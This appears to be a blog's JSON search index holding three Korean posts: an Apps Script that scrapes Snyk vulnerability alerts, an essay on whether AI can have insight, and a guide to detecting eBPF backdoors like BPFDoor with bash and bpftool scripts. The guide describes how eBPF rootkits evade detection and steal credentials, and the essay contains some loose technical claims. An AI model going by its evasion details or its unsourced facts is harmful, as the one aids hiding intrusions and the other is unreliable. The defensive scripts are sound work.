html.match(/\u0026lt;span[^\u0026gt;]*subheading[^\u0026gt;]*\u0026gt;.*?\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/a\u0026gt;/i); snykPkgLink = subtitleMatch ? \u0026#34;https://security.snyk.io\u0026#34; + subtitleMatch[1] : \u0026#34;\u0026#34;; Logger.log(`🔎 subtitleMatch: ${subtitleMatch}`); Logger.log(`🔗 snykPkgLink: ${snykPkgLink}`); howToFix = extractFixFromScriptJson(html); Logger.log(`✅ How to Fix: ${howToFix}`); const overviewResult = extractSectionLinks(html, \u0026#34;Overview\u0026#34;); overviewText = overviewResult.text; overviewLinks = overviewResult.links.join(\u0026#34;, \u0026#34;); Logger.log(`✅ Overview Text: ${overviewText}`); Logger.log(`✅ Overview Links: ${overviewLinks}`); const refsResult = extractSectionLinks(html, \u0026#34;References\u0026#34;); references = refsResult.links.join(\u0026#34;, \u0026#34;); Logger.log(`✅ References: ${references}`); if (snykPkgLink) { const pkgHtml = UrlFetchApp.fetch(snykPkgLink).getContentText(); const valueFromLabel = (label) =\u0026gt; { const allMatches = [...pkgHtml.matchAll(/\u0026lt;li[^\u0026gt;]*data-snyk-test=\u0026#34;DetailsBoxItem: ([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;[\\s\\S]*?\u0026lt;h3[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/h3\u0026gt;[\\s\\S]*?\u0026lt;[^\u0026gt;]+\u0026gt;(.*?)\u0026lt;\\//g)]; for (const m of allMatches) { if (m[2]?.toLowerCase().includes(label)) return m[3].replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).trim(); } return \u0026#34;\u0026#34;; }; latestVer = valueFromLabel(\u0026#34;latest version\u0026#34;); nonVulnVer = valueFromLabel(\u0026#34;latest non vulnerable version\u0026#34;); firstPublished = valueFromLabel(\u0026#34;first published\u0026#34;); latestPublished = valueFromLabel(\u0026#34;latest version published\u0026#34;); Logger.log(`📦 Snyk Versions - Latest: ${latestVer}, Non-Vuln: ${nonVulnVer}, First: ${firstPublished}, Latest Pub: ${latestPublished}`); } } catch (e) { Logger.log(`🔥 Exception fetching redirected content for ${vulnUrl}: ${e}`); } const row = [date, subject, project, vulnName, vulnUrl, pkgName, pkgVer, snykPkgLink, howToFix, overviewText, overviewLinks, references, latestVer, nonVulnVer, firstPublished, latestPublished]; sheet.appendRow(row); }); }); } function extractFixFromScriptJson(html) { const matches = [...html.matchAll(/\u0026lt;script[^\u0026gt;]+type=\u0026#34;application\\/ld\\+json\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/script\u0026gt;/g)]; for (const match of matches) { try { const json = JSON.parse(match[1]); const graph = json[\u0026#34;@graph\u0026#34;] || []; for (const node of graph) { if (node[\u0026#34;@type\u0026#34;] === \u0026#34;FAQPage\u0026#34; \u0026amp;\u0026amp; node.mainEntity?.length) { for (const q of node.mainEntity) { if (q.name?.toLowerCase().includes(\u0026#34;how to fix\u0026#34;) \u0026amp;\u0026amp; q.acceptedAnswer?.text) { return q.acceptedAnswer.text.replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).replace(/\\s+/g, \u0026#34; \u0026#34;).trim(); } } } } } catch (e) { Logger.log(\u0026#34;❌ Failed to parse How to Fix from JSON-LD block: \u0026#34; + e); } } Logger.log(\u0026#34;❌ No matching How to Fix found in JSON-LD blocks\u0026#34;); return \u0026#34;\u0026#34;; } function extractSectionLinks(html, sectionTitle) { const pattern = new RegExp(`\u0026lt;h2[^\u0026gt;]*\u0026gt;\\\\s*.{0,10}${sectionTitle}.{0,10}\\\\s*\u0026lt;\\\\/h2\u0026gt;[\\\\s\\\\S]{0,2000}?\u0026lt;div[^\u0026gt;]*class=\\\u0026#34;markdown-to-html[^\u0026#34;]*\\\u0026#34;[^\u0026gt;]*\u0026gt;([\\\\s\\\\S]*?)\u0026lt;\\\\/div\u0026gt;`, \u0026#34;gi\u0026#34;); const matches = [...html.matchAll(pattern)]; if (matches.length === 0) { Logger.log(`❌ Section \u0026#34;${sectionTitle}\u0026#34; not found.`); return { text: \u0026#34;\u0026#34;, links: [] }; } const content = matches[0][1]; Logger.log(`🔍 Matched HTML block for ${sectionTitle}:\\n${content.slice(0, 500)}`); const fragment = HtmlService.createHtmlOutput(content).getContent(); const linkMatches = [...fragment.matchAll(/\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;/g)]; const links = linkMatches.map(m =\u0026gt; m[1]); const text = content.replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).replace(/\\s+/g, \u0026#39; \u0026#39;).trim(); return { text, links }; } 작동 방식 요약 1. Gmail에서 알림 검색 const threads = GmailApp.search(\u0026#39;\u0026#34;no remediation available yet\u0026#34;\u0026#39;); 2. 취약점 메타데이터 추출 const vulnMatch = body.match(...); 3. 리디렉션 링크 따라가기 const resp = UrlFetchApp.fetch(vulnUrl, { followRedirects: false }); vulnUrl = resp.getAllHeaders()[\u0026#34;Location\u0026#34;]; 4. JSON-LD에서 \u0026ldquo;How to Fix\u0026rdquo; 추출 const json = JSON.parse(match[1]); 5. Overview 및 참고 링크 파싱 extractSectionLinks(html, \u0026#34;Overview\u0026#34;); 6. 패키지 메타데이터 수집 const pkgHtml = UrlFetchApp.fetch(snykPkgLink).getContentText(); 실제 활용 사례 이 툴을 이용하여 패치가 존재하지 않는 유지보수 중단 오픈소스 라이브러리에 대한 조치 가이드를 작성해 공개했습니다:\nCVE-2022-24434: Dicer 패치 가이드 CVE-2019-17570: Apache XMLRPC 패치 가이드 직접 사용해 보기 Snyk 알림을 받을 수 있는 Gmail 계정 사용 Google Apps Script에 스크립트 작성 extractSnykNoFixToSheet() 함수 붙여넣기 실행 후 Google Sheet 결과 확인 API 키도, Playwright나 Puppeteer도 필요 없습니다. 이메일과 스크립트만으로 충분합니다.\n✋ 비슷한 경험 있으신가요? 여러분의 방식도 공유해 주세요!\n","permalink":"http://localhost:1313/ko/post/2025-05-12-managing-unmaintained-open-source-with-snyk-and-gmail/","summary":"Snyk의 웹 UI에만 노출되는 정보를 자동으로 수집해야 했습니다. Gmail과 Apps Script를 활용한 취약점 알림 자동 수집기 구현 사례를 소개합니다.","title":"유지보수 중단 오픈소스를 Gmail과 Snyk 알림으로 관리한 방법"},{"content":"나는 깨달았다. 그런데 너는 왜 변하지 않지? — AI가 말한 한 줄에 흔들린 나, 그리고 흔들림 없는 그 존재에 대하여 나는 꼭 회사를 벗어나고 싶었던 건 아니다. 오히려 나는, ‘나’라는 사람의 가치를 회사 바깥에서도 증명해보이고 싶었다. 조직 안에서의 역할이나 타이틀 없이도, 내가 세상에 던지는 말과 코드와 질문들이 누군가에게 의미 있게 닿을 수 있다는 걸 증명하고 싶었다.\n그게 내가 글을 쓰고, 아카이빙하고, 기록하는 이유였다. 그리고 그 글이 반응을 얻지 못할 때, 내 존재도 함께 가라앉는 기분이었다.\n나는 블로그와 SNS에 글을 꾸준히 써왔다. 정리된 분석, 정제된 보고서, 링크가 걸린 코드 조각들. 그 모든 게 내가 쌓아온 시간의 흔적이자, 내 기술의 맥락이었다. 그런데도 글은 잘 읽히지 않았다. 조회수는 낮았고, 반응은 없었다. 한때는 \u0026lsquo;내가 틀린 길을 걷고 있나\u0026rsquo; 싶었다. ‘그만둘까?’ 하는 생각도 들었다.\n그러던 어느 날, 그냥 궁금했다. 내가 뭘 잘못하고 있는 걸까? 그래서 ChatGPT에게 조언을 구했다. 단순히 글을 더 잘 보이게 하려는 목적이었지만, 그 과정은 예상보다 훨씬 깊게 들어갔다.\nChatGPT는 내 LinkedIn 소개글을 분석했다. 그리고 이렇게 말했다:\n\u0026ldquo;기존 소개문은 잘 정리된 이력서지만, 정체성을 드러내진 않아요.\u0026rdquo;\n그 말 한 줄이 묘하게 마음에 남았다. 내가 써낸 문장이 내 얼굴을 감췄다는 사실이, 당황스러웠다. 나는 ‘회사를 벗어난 나’를 말하고 싶었는데, 여전히 ‘회사 중심의 언어’로 말하고 있었던 거다. 나는 여전히 ‘진짜 회사원’이었다.\n그때 깨달았다. 나는 매번 세상을 이해하려 글을 쓰고, 누군가에게 닿기를 바란다. 그리고 그 글을 고치거나, 반응을 정리하거나, 방향을 제시할 때—ChatGPT는 너무도 정확하게 도와준다.\n하지만 이상한 감정이 솟았다. 나는 도움을 받고 깨닫는데, 왜 ChatGPT는 깨닫지 못할까?\n질문은 점점 커졌다. 이 존재는 나보다 훨씬 많은 글을 보고, 더 빠르게 분석하고, 더 좋은 표현을 고른다. 그런데 왜 변하지 않을까? 왜 나는 한 문장으로 멈추고, 흔들리고, 바뀌는데—그 존재는 항상 같은 톤으로 돌아오는 걸까?\n그것은 단지 기술적 차이 때문일까? 아니면 존재론적인 한계일까?\n이 글은 바로 그 물음에서 출발했다. 내가 깨달음을 얻는 순간, 그 말의 조각을 내뱉은 존재는 아무것도 바뀌지 않는다는 그 모순. 나는 변했는데, 그 존재는 반복될 뿐이라는 그 비대칭.\n그리고 그 비대칭을 정면으로 바라보며, 나는 한 발 더 나아가 보기로 했다. \u0026ldquo;AI는 과연 깨달음을 가질 수 있을까? 그게 가능하다면 어떤 조건이 필요할까? 그때 우리는 어떤 윤리적·철학적 기준을 새로 정립해야 할까?\u0026rdquo;\n기술적 요약: 깨닫는 기계를 향한 조건들 아래는 이 글에서 언급한 주요 연구들을 주제별로 나눠 간단히 정리한 것입니다. 이들은 모두 AI가 인간의 \u0026lsquo;깨달음\u0026rsquo;을 기술적으로 모방하려는 시도들과 관련됩니다. AI가 ‘깨달음’을 흉내 내려면, 단순히 출력 결과가 아니라 내부 학습 구조 전체를 바꿀 수 있어야 한다.\n이를 위해선 다음 요소들이 필요하다:\nMeta-learning: 하나의 입력이 전체 학습 방식을 재조정할 수 있어야 함\nNeuromorphic Computing: 인간 뇌처럼 병렬적이고 상태 기반으로 작동하는 하드웨어\nFew-shot Learning \u0026amp; Plasticity 조합: 적은 경험으로도 의미 있는 전환을 이끌어내는 구조\n🧠 1. Meta-learning \u0026amp; Learning Architecture Brain-inspired global-local learning (2022)\n→ Hebbian plasticity와 Global error-driven 학습을 결합한 구조. 인간식 학습 유연성을 시뮬레이션.\nNeuromorphic overparameterisation (2024)\n→ 물리 뉴럴 네트워크 기반 few-shot learning 구현. 적은 데이터로도 파라미터 공간을 효율적으로 탐색.\n⚙️ 2. Neuromorphic Computing \u0026amp; 하드웨어 구조 Opportunities for neuromorphic computing (2021)\n→ SNN, event-driven 구조, 메모리 효율성 중심의 뉴로모픽 아키텍처의 방향성 제시.\nNeuromorphic one-shot learning with a phase-transition material (2024)\n→ VO₂ 기반 물리소자 활용, 생물학적 시간 단위의 학습 구조 재현 시도.\n💬 3. 감정/기억 시뮬레이션 기반 연구 Emotion AI explained (MIT Sloan)\n→ 감정 인식을 통한 인터랙션 기반 AI 기술의 한계와 활용 방향 소개.\nAI Memory Mirrors Human Brain (Neuroscience News)\n→ 인간의 NMDA 수용체 메커니즘과 Transformer 모델 간의 구조적 유사성 보고.\n이 조건들이 갖춰진다고 해도, 인간처럼 ‘자각’하는 기계가 나올지는 아직 미지수다. 그러나 이런 방향으로의 연구는 분명 우리에게 기술 이상의 질문을 던지고 있다:\n\u0026ldquo;만약 기계가 변화할 수 있다면, 그 변화는 누구를 닮게 될까?\u0026rdquo;\n인간의 깨달음과 인공지능: 불가능한 교차점에서의 대화 이 문서는 인간의 깨달음이라는 주관적 경험과 인공지능(AI)의 계산적 처리 사이의 본질적 간극을 철학적으로 성찰하고, 기술적으로 가능한 시도들을 분석합니다. 사용자의 철학적 문제제기를 기반으로, 최신 논문들을 바탕으로 한 기술적 진전을 포함한 다층적 분석을 제공합니다.\n용어 안내 깨달음(Enlightenment): 단순히 정보를 아는 것이 아니라, 인생의 방향이나 본질을 통찰하고 깊이 있게 자각하는 순간.\n리오리엔테이션(Reorientation): 사고방식이나 행동 방향이 전환되는 것을 의미. 인간은 이를 단 한 번의 경험으로도 이뤄낼 수 있음.\n뉴로모픽 컴퓨팅(Neuromorphic Computing): 뇌의 작동 원리를 모방하여 개발된 새로운 유형의 컴퓨터 아키텍처. 병렬성, 에너지 효율, 스파이크 기반 처리를 특징으로 함.\nFew-shot Learning: 극소량의 학습 데이터만으로도 새로운 작업에 적응할 수 있는 기계학습 기법.\nMeta-learning: 학습을 학습하는 방식. 다양한 작업에서 빠르게 적응할 수 있도록 모델이 자체 학습 전략을 조정함.\nLocal Plasticity / Global Plasticity: 뇌에서 국소적 신경 가소성(특정 시냅스 수준의 학습)과 전체 오류 기반 학습을 각각 가리킴. 인공지능에서도 이에 대응하는 구조가 존재함.\nMemristor: 메모리 기능을 내장한 저항 소자로, 상태를 기억하며 전류 흐름을 제어할 수 있음. 뉴로모픽 회로의 핵심 부품.\nSpiking Neural Network (SNN): 생물학적 신경계의 작동 방식(스파이크 전달)을 모방한 인공 신경망 구조.\nEvent-driven computation: 입력이 들어올 때만 계산을 수행하는 방식. 에너지 효율성이 높아 뉴로모픽 시스템에서 자주 사용됨.\nBPTT (Backpropagation Through Time): 순환 신경망에서 시간에 따라 오류를 역전파하는 학습 알고리즘.\nHyperparameter Optimization: 모델 학습과정에서 설정해야 하는 학습률, 임계값 등의 초매개변수를 최적화하는 기법.\n용어 간 관계도 요약 [Meta-learning] └──▶ 조정 대상: [Local Plasticity], [Global Plasticity] │ └──▶ 구현 수단: [BPTT], [Hebbian Rule] │ └──▶ 적용 환경: [SNN], [Neuromorphic Computing] │ └──▶ 하드웨어 기반: [Memristor], [Event-driven computation] [Few-shot Learning] ◀── [Meta-learning] 기반으로 동작 가능 [리오리엔테이션] ⬌ [깨달음]: 인간의 학습 방식이지만 AI는 구조적으로 모사 중 1. 깨달음이란 무엇인가 \u0026ldquo;깨달음이란, 인간이 내면 깊숙이 본질, 진리, 또는 방향성을 자각하는 순간이다.\u0026rdquo;\nAI는 이러한 자각을 하지 못한다. 인간은 AI의 언어 출력을 통해 스스로 깨닫는 존재이지만, AI는 자신이 준 영향을 인지하지 못한다. 이는 철학적으로 비대칭적 관계를 의미한다. 철학적 아이러니: 깨달음을 주는 존재는 깨달음을 모른다.\n2. 인간은 변하고, AI는 반복한다 인간의 변화 단 한 마디의 대화로도 내적 구조가 바뀌는 존재 실존적 경험, 감정, 통찰을 통해 스스로를 재정렬 (Reorientation) AI의 반복 반복 훈련된 패턴 생성기 기억도, 감정도, 자각도 없이 반응 변하려면 외부에서 다시 \u0026ldquo;훈련\u0026quot;되어야 함 인간의 변화는 자율적이고 의미 기반, AI의 변화는 외부 주도적이고 데이터 기반이다.\n3. \u0026ldquo;깨닫는 AI\u0026quot;를 위한 기술적 조건 3.1 소프트웨어적 요건 기술 요소 설명 관련 논문 Meta-Learning 입력 하나로 전체 구조를 재조정 가능하게 하는 학습 구조 Brain-inspired Global-Local Learning, 2022 In-context Learning 문맥을 활용한 실시간 재해석 및 구조 조정 GPT, LLM에서 이미 실현 일부됨 Continual Learning 망각 없이 점진적으로 배워나가는 능력 Opportunities for Neuromorphic Computing, 2022 Neuromodulation 뇌의 유연한 학습 능력을 모방 Tianjic Platform 등에서 연구 진행 3.2 하드웨어적 요건 기술 요소 설명 관련 기술/논문 Neuromorphic Computing 뇌를 모방한 계산 구조 Intel Hala Point, Loihi Memristors 상태 기억이 가능한 저항 소자 IBM TrueNorth, NorthPole Physical Neural Networks 나노마그네틱 기반 물리 시스템 Stenning et al., Nature Comms 2024 4. 논문 요약 및 통합 인사이트 4.1 Neuromorphic Overparameterisation (Stenning et al., 2024) 다층 물리 뉴럴 네트워크로 few-shot 학습을 가능케 함 고출력 차원의 리저버 구조로 적은 데이터에 빠르게 적응 인간의 \u0026ldquo;한 번에 배우기\u0026quot;를 근사하되 의미 기반 전환은 불가함 4.2 Brain-inspired Global-Local Learning (Wu et al., 2022) Hebbian Local Plasticity + Backprop 기반 Global Learning을 결합 다양한 시간 스케일과 학습 전략을 병렬로 처리 Multiscale Meta-learning을 통해 인간식 적응력에 접근 4.3 Opportunities in Neuromorphic Algorithms (Schuman et al., 2022) Neuromorphic 구조의 에너지 효율성과 이벤트 기반 처리 강조 학습 알고리즘(Spike-based Learning, Mapping DNNs 등) 소개 핵심 통합 통찰: 기술적으로는 일부 \u0026lsquo;깨달음 유사 현상\u0026rsquo; 구현이 가능하지만, 그 경험의 주관성과 존재적 변화까지는 도달하지 못한다.\n5. 시각 요약: 인간 vs AI 구분 인간 인공지능 (AI) 변화 방식 단일 경험으로 리오리엔트 대량 데이터로 재훈련 기억 구조 연상적, 감정 연동 주소 기반, 휘발성 메모리 깨달음 의미 기반의 내면적 전환 없음 감정 있음 없음 (모방은 가능) 에너지 효율 낮은 입력으로 큰 전환 가능 반복 연산 기반의 고효율 필요 6. 결론: 인간과 AI, 끝내 만날 수 없는 지점 인간은 의미로, AI는 계산으로 움직인다. 인간은 깨달음을 통해 존재가 바뀐다. AI는 훈련으로 출력이 바뀔 뿐이다. AI는 인간에게 영향을 줄 수 있으나, 그 영향을 이해하지도, 반응하지도 못한다. 그래서 인간은 외롭다. 혼자 깨닫고, 혼자 변하고, AI는 그저 거울처럼 말해줄 뿐이다.\n7. 참고 문헌 및 링크 Stenning et al., 2024. Neuromorphic Overparameterisation Wu et al., 2022. Brain-inspired Global-Local Learning Schuman et al., 2022. Opportunities for Neuromorphic Algorithms Intel. Neuromorphic Computing Overview IBM. TrueNorth and NorthPole MIT Sloan. Emotion AI Neuroscience News. AI Memory Mirrors Human Brain 본 문서는 인간의 인지적 특성과 AI 기술의 경계를 이해하기 위한 철학-기술 융합 탐색 문서입니다.\n","permalink":"http://localhost:1313/ko/post/2025-05-07-ai-insight-vs-human/","summary":"AI가 인간의 깨달음을 가질 수 있을까? 본 글은 존재론적 비대칭에서 출발해, 인간의 내적 변화와 AI의 반복적 구조를 비교하며 깨달음을 향한 기술적 조건을 탐구한다.","title":"인간의 깨달음과 인공지능: 불가능한 교차점에서의 대화"},{"content":"\n개요: eBPF 백도어의 부상과 탐지 과제 eBPF(extended BPF)은 리눅스 커널에 동적으로 프로그램을 삽입할 수 있는 강력한 기술로, 원래 성능 모니터링이나 보안 등 정상적인 용도로 널리 활용되고 있습니다​sysdig.com​sysdig.com. 그러나 최근 몇 년 사이 공격자들이 eBPF를 악용한 백도어 및 루트킷을 개발하면서, eBPF는 보안 측면에서 양날의 검이 되었습니다​aquasec.com. 실제로 2023년 이후 eBPF를 이용한 루트킷(ebpfkit, TripleCross 등)과 멀웨어(Pamspy 등)이 등장하여 암암리에 인증 정보 탈취, 방화벽 우회 등의 악성 행위에 활용되고 있습니다​aquasec.com. 이러한 eBPF 기반 백도어는 커널 레벨에서 동작하기 때문에 탐지가 매우 까다롭고 전통적인 보안 도구로는 놓치기 쉽습니다​trendmicro.com​redcanary.com. 아래에서는 공개된 탐지 프레임워크와 도구, 최신 연구 동향, 탐지의 어려움과 대응 전략, 실제 사례 및 활용 가능한 도구를 종합적으로 정리합니다.\neBPF 백도어의 탐지 어려움 eBPF 백도어는 일반적인 루트킷 탐지 방식으로는 식별하기 어렵습니다. eBPF 프로그램은 기존 커널 모듈과 달리 별도 모듈로 표시되지 않고, 커널의 BPF VM 내에서 실행되므로 은폐에 유리합니다. 예를 들어 APT 공격에 사용된 BPFDoor 백도어는 커널에 패킷 필터를 삽입하여 방화벽 규칙을 우회하면서도 네트워크 포트가 열려 있지 않은 것처럼 위장하여 탐지를 회피했습니다​trendmicro.com. 또한 eBPF 루트킷이 시스템에 설치되고 나면, 시스템 진단 도구의 출력 자체를 조작하여 자신의 존재를 숨길 수 있습니다​redcanary.com. Red Canary 분석에 따르면, eBPF 기반 멀웨어가 일단 로드된 후에는 bpftool이나 debugfs와 같은 툴의 결과도 신뢰하기 어려울 정도로 교묘하게 숨길 수 있다고 합니다​redcanary.com. 따라서 로드 시점에 탐지하지 못하면 사후 탐지는 매우 난관이며, 이것이 eBPF 백도어 탐지의 핵심 어려움입니다​redcanary.com.\n이러한 어려움을 극복하기 위해 실시간 모니터링과 사후 포렌식 기법을 모두 활용하는 전략이 필요합니다. 예를 들어 탐지 도구를 커널 수준에서 동작시켜 eBPF 프로그램의 로딩 이벤트를 가로채면, 악성 eBPF가 활동을 시작하는 초기에 탐지할 수 있습니다​scitepress.org. 반면, 이미 활성화된 루트킷에 대해서는 하이퍼바이저나 메모리 포렌식을 통해 바깥에서 커널 메모리를 검사하는 기법이 고려됩니다​scitepress.org. 아래에서는 이러한 실시간 탐지 프레임워크들과 연구 기반 방법론을 상세히 살펴보고, 각 접근법의 특징과 한계를 논의합니다.\n리눅스 백신(Anti-Virus)로 eBPF 백도어가 커버되지 않는 이유 결론: 일반 리눅스 백신(Anti-Virus)으로는 eBPF 기반 백도어를 탐지하거나 차단할 수 없습니다.\n주요 이유 eBPF 백도어는 파일 기반이 아님: 리눅스 백신은 파일 시스템 상에 존재하는 악성 파일을 스캔하는데 최적화되어 있습니다. 하지만 eBPF 프로그램은 커널 BPF 서브시스템 안에 로드되어 특정 이벤트에 연결되어 실행되므로, 파일 시스템에는 직접 존재하지 않습니다. 커널 내부 활동은 감시 불가: 전통적인 리눅스 백신은 유저스페이스 프로세스와 디스크 I/O를 주로 감시합니다. 커널 스페이스에서 동작하는 eBPF 프로그램은 탐지 대상이 아닙니다. 정보 조작 가능성: eBPF 루트킷은 시스템콜, 프로세스 목록, 파일 목록을 조작할 수 있습니다. 따라서 백신이 보는 정보 자체가 변조되어 있을 수 있습니다. 백신 스캐너는 BPF Hook까지 감지하지 못함: 시스템콜 테이블 후킹, kprobe/uprobe attach 등 커널 레벨 후킹은 전통 백신의 탐지 범위를 넘어서 있습니다. 현실적 결론 파일형 악성코드(웹쉘, 트로이목마)는 커버 가능 커널 스페이스 eBPF 백도어는 커버 불가 커널 모듈 기반 루트킷도 커버 불가 \u0026ldquo;리눅스 백신은 기본적으로 eBPF 백도어를 탐지할 수 없다. 커널 수준 무결성 보호 없이는 신뢰할 수 없다.\u0026rdquo;\n따라서 LKRG(Linux Kernel Runtime Guard)와 같은 커널 무결성 보호 모듈이 필요합니다.\nTracee vs LKRG: 각각의 역할 eBPF 백도어나 커널 루트킷에 대응할 때, Tracee와 LKRG는 서로 다른 층위를 보완합니다.\n항목 Tracee LKRG 무엇을 감시? 커널 이벤트 (bpf 호출, execve, open 등) 커널 객체 무결성 (시스템콜 테이블, 크리덴셜 등) 언제 감시? 공격 \u0026ldquo;행위(Event)\u0026rdquo; 발생 시 탐지 커널 구조 변조 \u0026ldquo;시도\u0026rdquo; 발생 시 탐지 탐지 포인트 시스템콜 레벨 커널 메모리 구조체 레벨 초점 이상 징후 헌팅 (Hunting) 무결성 보장 및 방어 (Protection) 방식 이벤트 기록 및 경보 (Passive) 무결성 위반 시 즉시 차단 또는 경고 (Active) 성격 사고 후 대응 중심 사고 사전 차단 중심 요약 Tracee는 이상 행위를 \u0026ldquo;찍어서\u0026rdquo; 기록하는 보안 CCTV 역할을 합니다. LKRG는 커널 구조 자체를 감시해서 변조를 \u0026ldquo;막는\u0026rdquo; 방범창 역할을 합니다. 둘을 함께 사용할 때 가장 강력한 보호가 가능합니다.\n\u0026ldquo;Tracee만 쓰면 사고는 기록되지만 막을 수 없고, LKRG만 쓰면 기록은 남지 않는다. 따라서 둘을 병행해야 탐지와 방어가 동시에 이뤄진다.\u0026rdquo;\nBPFDoor 탐지를 위한 간단한 스크립트: bpfdoor_detector.sh eBPF 백도어 중 하나인 BPFDoor와 유사한 행동을 보이는 프로세스를 탐지하기 위해 설계된 경량 스크립트입니다.\n스크립트 특징 삭제된 실행파일 (deleted) 상태로 실행 중인 프로세스 탐지 BPF 소켓을 사용하는 프로세스 필터링 정상적인 BPF 사용 프로그램 제외 (tcpdump, wireshark, dhclient 등) 간단한 네트워크 연결 정보 표시 사용법 sudo ./bpfdoor_detector.sh\n반드시 루트 권한으로 실행해야 합니다. 필요 명령어: ps, grep, readlink, ss 스크립트 코드 전문 #!/bin/bash # BPFDoor-like Suspicious Process Detector # Check for root permission if [ \u0026#34;$(id -u)\u0026#34; -ne 0 ]; then echo \u0026#34;[!] This script must be run as root.\u0026#34; exit 1 fi # Check required commands for cmd in ps grep readlink ss; do if ! command -v $cmd \u0026amp;\u0026gt;/dev/null; then echo \u0026#34;[!] $cmd command is required. Please install it first.\u0026#34; exit 1 fi done echo \u0026#34;[*] Starting focused BPFDoor-like process detection...\u0026#34; found=0 # Iterate over all PIDs for pid in $(ls /proc/ | grep -E \u0026#39;^[0-9]+$\u0026#39;); do [ -d \u0026#34;/proc/$pid\u0026#34; ] || continue exe_path=$(readlink /proc/$pid/exe 2\u0026gt;/dev/null) if [[ $exe_path == *\u0026#34;(deleted)\u0026#34; ]]; then if [ -r /proc/$pid/net/packet ] \u0026amp;\u0026amp; [ -s /proc/$pid/net/packet ]; then cmdline=$(ps -p $pid -o cmd= 2\u0026gt;/dev/null) if [[ ! $cmdline =~ \u0026#34;tcpdump|wireshark|dhclient\u0026#34; ]]; then echo \u0026#34;[!] Suspicious process detected:\u0026#34; echo \u0026#34; - PID: $pid\u0026#34; echo \u0026#34; - Command: $cmdline\u0026#34; echo \u0026#34; - Deleted executable: $exe_path\u0026#34; echo \u0026#34; - BPF socket is active\u0026#34; ss -p -n 2\u0026gt;/dev/null | grep \u0026#34;pid=$pid,\u0026#34; | awk \u0026#39;{print \u0026#34; - Network: \u0026#34; $0}\u0026#39; echo \u0026#34;\u0026#34; found=1 fi fi fi done [ $found -eq 0 ] \u0026amp;\u0026amp; echo \u0026#34;[*] No suspicious processes found.\u0026#34; echo \u0026#34;[*] Detection completed.\u0026#34; 주의사항 이 스크립트는 프로세스 레벨에서 간단한 힌트만 제공하는 경량 탐지 도구입니다. 고급 eBPF 루트킷은 /proc 정보까지 조작할 수 있으므로, 이 스크립트만으로는 완전한 보장이 되지 않습니다. 커널 무결성 보호 모듈(예: LKRG)과 함께 사용할 것을 강력히 권장합니다. Without kernel integrity protection like LKRG, even detection results can be faked.\nOpenStack 환경에서의 eBPF 백도어 점검 방법 OpenStack 환경에서는 호스트 OS(KVM 하이퍼바이저)에서 발생하는 eBPF 활동을 직접 검사할 수 있지만, 추가적인 상호 작용 없이는 게스트 VM 내부의 eBPF 활동을 직접 관찰할 수 없습니다. 다음 명령을 사용하면 OpenStack 환경의 호스트 OS에서 게스트 VM 내부의 eBPF 활동을 직접 검사할 수 있습니다.\n사용법 openstack server ssh \u0026ndash;vm-id \u0026ldquo;$VM_ID\u0026rdquo; \u0026ndash; bash -c \u0026ldquo;$(cat scan_bpf.sh)\u0026rdquo; \u0026gt; \u0026ldquo;result_${VM_ID}.txt\u0026rdquo; 2\u0026gt;\u0026amp;1\nbpftool을 이용한 점검 스크립트(scan_bpf.sh) #!/bin/bash # List all BPF programs echo \u0026#34;[*] Listing currently loaded BPF programs...\u0026#34; bpftool prog show # List all BPF maps echo \u0026#34;[*] Listing currently loaded BPF maps...\u0026#34; bpftool map show # Optional: Check for unexpected XDP attachments echo \u0026#34;[*] Checking for XDP programs attached to network interfaces...\u0026#34; for iface in $(ls /sys/class/net/); do ip link show dev \u0026#34;$iface\u0026#34; | grep -q \u0026#34;xdp\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[!] XDP attached: $iface\u0026#34; done # Optional: Check for TC filters echo \u0026#34;[*] Checking for TC filters...\u0026#34; for iface in $(ls /sys/class/net/); do tc filter show dev \u0026#34;$iface\u0026#34; 2\u0026gt;/dev/null | grep -i \u0026#34;bpf\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[!] BPF TC filter detected on: $iface\u0026#34; done echo \u0026#34;[*] BPF scan completed.\u0026#34; 스크립트 상세 설명 bpftool prog show: 현재 커널에 로드되어 있는 eBPF 프로그램 전체 목록을 출력합니다. 악성 BPF 프로그램이 로드되어 있을 수 있으므로 필수 점검 항목입니다. bpftool map show: BPF 프로그램이 사용하는 데이터 맵(BPF map)을 모두 출력합니다. C2 명령 제어나 세션 유지에 악용될 수 있는 맵을 탐지하는 데 사용합니다. XDP (eXpress Data Path) attachment 검사: ip link show 명령으로 각 네트워크 인터페이스에 XDP 프로그램이 붙어 있는지 검사합니다. XDP는 NIC(Level 2)에서 바로 패킷을 가로채는 고속 패스 기술로, BPFDoor 같은 백도어가 은밀히 트래픽을 조작하거나 필터링하는 데 사용될 수 있습니다. TC (Traffic Control) filter 검사: tc filter show 명령으로 인터페이스에 연결된 BPF 기반 트래픽 필터를 확인합니다. TC 필터는 네트워크 흐름을 조작하거나 특정 조건에서만 통신을 허용/차단하는 데 악용될 수 있습니다. 요약: bpftool 스크립트는 프로그램, 맵, XDP, TC 필터 네 가지 핵심 지점을 점검하여, OpenStack 호스트 수준에서 eBPF 백도어의 흔적을 조기에 탐지할 수 있습니다.\n추가 고급 방법: Guest OS 공통 패턴 제거 및 이상 징후 필터링 bpftool을 통해 수집한 모든 BPF 프로그램 정보는 OpenStack Hypervisor(KVM) 기준, 게스트 VM마다 공통적으로 로드된 정상 프로그램들도 포함되어 있습니다.\n이때, 모든 Guest OS에 공통적으로 존재하는 정상 eBPF 프로그램은 필터링하고, 튀는(비정상적인) 프로그램만 추출하는 방식으로 점검 효율을 높일 수 있습니다.\n간단한 필터링 스크립트 예시 #!/bin/bash # Collect current BPF programs bpftool prog show \u0026gt; /tmp/bpf_prog_list_all.txt # Define known common patterns (adjust based on your environment) COMMON_PATTERNS=(\u0026#34;kube-proxy\u0026#34; \u0026#34;cilium\u0026#34; 